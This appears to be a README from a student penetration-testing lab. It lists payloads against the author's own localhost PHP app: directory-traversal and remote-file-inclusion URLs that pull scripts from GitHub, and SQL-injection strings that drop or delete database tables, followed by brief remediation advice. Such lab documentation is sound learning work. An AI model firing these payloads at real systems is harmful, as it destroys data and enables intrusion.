# Penetration Testing Main Project
I will host all payloads useed to execute penetration testing tests against the localhost web application.

## Auth2.php

Directory Traversal: 
```
http://localhost/Project23/auth2.php?FileToView=css/style.css
```

File Inclusion:
```
http://localhost/Project23/auth2.php?FileToView=index.php
```

XSS Reflective:
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-xss/main/Lab11-fixed.php
```

Accessing unsecured Admin Portal (File Inclusion / Directory Traversal):
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-mainproject/main/redirect-admin-portal.js
```

## Register.php
This is the signup page - ```http://localhost/Project23/register.php```

### SQL Injection
This query includes the commented noise ```--AbC1xyz```, which meets the specified criteria of being at least 8 characters long, containing a mix of uppercase and lowercase letters, and including a digit for the password sanitation. The commented noise itself will not affect the execution of the SQL query but adds some complexity to the string. I do not want the noise to affect the SQL query should ultimately achieves SQL Injection. Here's a breakdown of the query: <br/>

```
'; DROP TABLE loginevents; --AbC1xyz'
```

1. ```';``` This part closes the original SQL statement (if any) and starts a new one. <br/>
2. ```DROP TABLE loginevents;``` This is a SQL command that deletes the specified table (```loginevents``` in this case) from the database. <br/>
3. ```--``` This is a SQL comment that comments out the rest of the original query. It helps to avoid syntax errors that might occur due to the injection.

```
'; DELETE FROM loginevents; --AbC1xyz'
```

```
'; DELETE FROM sapusers; --AbC1xyz'
```

In either case, a ```password_hash``` is used to securely hash the user's password before storing it in the database. <br/>
Additionally, a prepared statement is used to prevent SQL injection. Always hash passwords and avoid inserting user input directly into SQL queries.

It's still concerning if the input is being directly stored in the SQL database without proper sanitation, as it could lead to SQL injection vulnerabilities. <br/>
To avoid this, we should always use parameterized queries or prepared statements to handle user input in SQL queries.
